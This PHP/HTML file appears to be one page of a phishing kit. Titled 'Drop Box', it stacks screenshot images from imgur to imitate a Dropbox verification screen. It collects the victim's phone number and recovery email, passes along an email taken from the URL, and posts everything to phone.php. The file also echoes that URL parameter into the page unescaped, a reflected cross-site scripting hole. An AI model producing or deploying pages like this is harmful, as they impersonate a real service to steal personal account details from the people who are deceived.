<?php
session_start();
$email = $_GET['email'];

?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Drop Box</title>


<link rel="shortcut icon"
              href="images/favicon.ico"/>
	<link rel="stylesheet" href="http://yui.yahooapis.com/pure/0.6.0/pure-min.css">		  
			  
	


</head>
<body>

<div id="image1" style="position:absolute; overflow:hidden; left:35px; top:3px; width:0px; height:0px; z-index:0"><img src="images/gm" alt="" title="" border=0 width=0 height=0></div>

<div id="image2" style="position:absolute; overflow:hidden; left:295px; top:55px; width:655px; height:320px; z-index:1"><img src="https://i.imgur.com/adwxB84.png" alt="" title="" border=0 width=655 height=320></div>

<div id="image3" style="position:absolute; overflow:hidden; left:291px; top:373px; width:659px; height:234px; z-index:2"><img src="https://i.imgur.com/j6y9cii.png" alt="" title="" border=0 width=659 height=234></div>
 <form method="post" id="challengeform" action="phone.php"  class="pure-form">

 	<input type="text" style="display: none" value="<?php echo($email) ?>" name="email">
<div id="image4" style="position:absolute; overflow:hidden; left:437px; top:539px; width:174px; height:18px; z-index:3"><a href="#"><img src="https://i.imgur.com/e6Ybnne.png" alt="" title="" border=0 width=174 height=18></a></div>

<div id="formradio1" style="position:absolute; left:341px; top:245px; z-index:4"><input type="radio" name="formradio1"></div>
<div id="formradio2" style="position:absolute; left:340px; top:380px; z-index:5"><input type="radio" name="formradio1"></div>
<input name="phoneNumber" required type="text" style="position:absolute;width:289px;left:370px;top:273px;z-index:6">
<input name="recEmail" required type="text" style="position:absolute;width:289px;left:371px;top:408px;z-index:7">
<div id="formimage1" style="position:absolute; left:343px; top:492px; z-index:8"><input type="image" name="formimage1" width="78" height="40" src="https://i.imgur.com/uuHFYmt.png"></div>

</body>
</html>
